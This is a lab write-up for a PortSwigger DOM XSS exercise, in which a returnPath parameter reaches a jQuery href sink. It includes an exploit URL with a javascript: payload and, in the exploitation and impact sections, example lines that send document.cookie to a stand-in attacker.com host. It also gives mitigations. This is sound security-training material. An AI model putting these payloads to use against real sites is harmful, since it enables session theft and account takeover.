# Lab 06: DOM XSS in jQuery Anchor `href` Attribute Sink Using `location.search` Source

> **Lab URL:** [PortSwigger Web Security Academy — DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-jquery-anchor-href-attribute-sink)  
> **Difficulty:** 🟢 Apprentice  
> **Status:** ✅ Solved  
> **Date Solved:** 2026-10-19  
> **Category:** `XSS-Cross-Site-Scripting`

---

## 📋 Lab Description

> This lab contains a DOM-based cross-site scripting vulnerability in the **Submit Feedback** page. The code takes the `returnPath` URL parameter and writes it directly into the `href` attribute of the **Back** link using jQuery:
>
> ```javascript
> $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
> ```
>
> To solve the lab, inject a payload that calls `alert()` when the victim clicks the Back link (or loads the page with the malicious `returnPath`).

---

## 🔍 Reconnaissance

### Step 1: Find the Entry Point
- Open the lab → Go to **Submit feedback** ( `/feedback` )
- Check page source: there is a hidden **Back** link (`<a id="backLink">Back</a>`) at the bottom.

### Step 2: Identify the Sink & Source
Inspect the **Network → Response** and **Inspector → HTML**:

**Vulnerable code (from lab response):**
```javascript
<script>
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
</script>
<div class="is-linkback">
    <a id="backLink">Back</a>
</div>
```

| Role | Detail |
|------|--------|
| **Source** | `window.location.search` → `URLSearchParams.get('returnPath')` (fully attacker-controlled) |
| **Sink** | `$('#backLink').attr("href", ...)` — jQuery anchor `href` attribute |
| **Context** | `href` allows `javascript:` URLs → immediate XSS on click |

> ✅ This is classic **DOM XSS**: no server reflection needed, the browser itself writes attacker input into the DOM.

---

## 🚀 Exploitation

### Step 1: Confirm the Sink is Controllable (Benign Test)
Visit:
```
/feedback?returnPath=https://google.com
```
- The **Back** link now points to `https://google.com`
- Clicking it redirects to Google → confirms `returnPath` controls `href`.

<img width="1280" height="684" alt="Screenshot 2026-11-08 163404" src="https://github.com/user-attachments/assets/ce88143e-cfe9-4bb7-aa2c-713d1b3ea8f6" />


### Step 2: Craft the XSS Payload
The `href` sink executes `javascript:` URLs when clicked:
```
javascript:alert(document.cookie)
```

Full exploit URL:
```
https://0a9700a0488f99c814a207009200e9.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

- `javascript:` is not filtered
- `alert(document.cookie)` proves cookie access (real-world: `fetch attacker.com?c=`+document.cookie)

<img width="1280" height="684" alt="Screenshot 2026-11-08 163826" src="https://github.com/user-attachments/assets/68fdb83d-aa14-46cf-afc2-455220f69a63" />


### Step 3: Trigger the Payload
- Load the exploit URL
- The page sets `backLink.href = "javascript:alert(document.cookie)"`
- **Click** the **Back** link (or the payload fires immediately in some browsers).
- Browser shows `alert()` popup with content like `{17e382c8-2671-488c-973f-81181db7a186}:carlos`

<img width="1280" height="684" alt="Screenshot 2026-11-08 164142" src="https://github.com/user-attachments/assets/abbe451a-b9e2-4536-9ba1-b919004ff0f0" />
<img width="1280" height="684" alt="Screenshot 2026-11-08 164550" src="https://github.com/user-attachments/assets/2663845f-fc68-4881-862a-43d711b2fc53" />



### Step 4: Lab Solved
PortSwigger banner turns green:
```
Congratulations, you solved the lab!
```

<img width="1280" height="684" alt="Screenshot 2026-11-08 164703" src="https://github.com/user-attachments/assets/49f8187c-e8d5-4827-bcfd-de1f4ab22484" />


---

## 📸 Proof of Concept

### 01 — Lab Overview (Solved)
<img width="1280" height="684" alt="Screenshot 2026-11-08 164703" src="https://github.com/user-attachments/assets/6da412c6-7c81-4fe6-924e-9eec851edd12" />

> Initial page after solving — orange "Congratulations, you solved the lab!" banner. Lab ID `0a9700a...` and `LAB: Solved` badge visible.

---

### 02 — Vulnerable Sink in Network Response
<img width="1280" height="684" alt="Screenshot 2026-11-08 162155" src="https://github.com/user-attachments/assets/8d0a2a15-0f71-4960-90dd-34a9ded2181a" />

> **Where the bug lives.** DevTools → Network → `feedback?returnPath=...` → Response HTML line 70-71:
> `$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));`
> Source = `location.search`, Sink = jQuery `href`. No encoding.

---

### 03 — Benign Test: Control the Back Link
<img width="1280" height="684" alt="Screenshot 2026-11-08 161242" src="https://github.com/user-attachments/assets/71b90b03-72a8-4d73-b8cd-257003bca77d" />

> Testing with `?returnPath=https://google.com` — confirms we control the `href`. Clicking Back goes to Google. This proves the sink is exploitable before using `javascript:`.

---

### 04 — Exploit URL with `javascript:alert(document.cookie)`
!<img width="1280" height="684" alt="Screenshot 2026-11-08 164037" src="https://github.com/user-attachments/assets/132cb8f6-f2a3-4502-a769-f995ecb2801f" />

> Payload in address bar: `.../feedback?returnPath=javascript:alert(document.cookie)`  
> The lab shows `LAB: Not solved` *before* click, `Back` link now has `href="javascript:alert(...)"`.

---

### 05 — XSS Executed — Alert with Cookie
<img width="1280" height="684" alt="Screenshot 2026-11-08 164532" src="https://github.com/user-attachments/assets/3ecf6f88-a95c-4d22-9142-92277cf0b00b" />
<img width="1280" height="684" alt="Screenshot 2026-11-08 164550" src="https://github.com/user-attachments/assets/305bd47f-026c-4005-9f24-6b25df821e0c" />


> After clicking **Back**, `alert()` fires and shows the cookie: ` {17e382c8-2671-488c...}:carlos `  
> This is the target DOM XSS execution.

---

### 06 — Final Solved State (Cookie Proof)
<img width="1280" height="684" alt="Screenshot 2026-11-08 164550" src="https://github.com/user-attachments/assets/21511b53-67df-420c-80e0-1bc866e1b4d5" />

> Final `LAB: Solved` badge + orange banner. The alert popup confirms `document.cookie` was accessible — impact: session hijack if `HttpOnly=false` (here lab cookie shows `HttpOnly:false` in Storage tab).

---

## 🧠 Key Takeaways

### 1. Root Cause
- **Client-side DOM write without validation.** `location.search` is taken as-is and passed to `attr("href", ...)`.
- `javascript:` URLs are dangerous sinks — same as `eval()`, `innerHTML`, `document.write`.

### 2. Impact
- **Session hijack:** `alert(document.cookie)` → attacker can exfiltrate `fetch('https://attacker.com?c='+document.cookie)`
- **Phishing / UI redressing:** `returnPath=https://evil.com` tricks victim into leaving the site.
- **Account takeover** if combined with other flaws.

### 3. Why Developer Tools Matter
- **Network → Response** shows the *exact* server-sent JS (no guessing).
- **Inspector → HTML** confirms the `backLink` exists and `form#feedbackForm` structure — helps craft realistic reports.

---

## 🛡️ Mitigation

| Fix | How |
|-----|-----|
| **Allow-list returnPath** | Only accept `/`, `/home`, `/feedback` — reject anything with `:` or `//`. |
| **Validate URL scheme** | If dynamic, allow only `http:`/`https:` and same-origin: `new URL(value, location.origin).origin === location.origin` |
| **Don't use `location.search` for href** | Use server-side redirect map: `?return=1` → lookup safe URL. |
| **CSP** | `Content-Security-Policy: default-src 'self'` blocks `javascript:` execution (defense in depth). |
| **HttpOnly + Secure cookies** | Prevents cookie theft via XSS (but does NOT fix XSS). |
| **Trusted Types** | Block assignment to `href` unless sanitized. |

**Secure example:**
```javascript
const allowed = new Set(['/', '/home', '/my-account']);
let path = new URLSearchParams(location.search).get('returnPath');
if (!allowed.has(path)) path = '/';
$('#backLink').attr('href', path);
```

---

## 📚 References

- [PortSwigger — DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [PortSwigger — Lab: DOM XSS in jQuery anchor href attribute sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-jquery-anchor-href-attribute-sink)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOM XSS Sources & Sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based/dom-xss-sources-and-sinks)

---


> 📝 **Author:** Saber Hasan Swoyon   
> 🛠️ **Tools:** Firefox + Burp Suite, Kali Linux (VirtualBox), DevTools (Network, Inspector, Storage)  
> ⚠️ **Disclaimer:** Tested only on PortSwigger's deliberately vulnerable lab in an authorized environment. Never test systems without written permission.
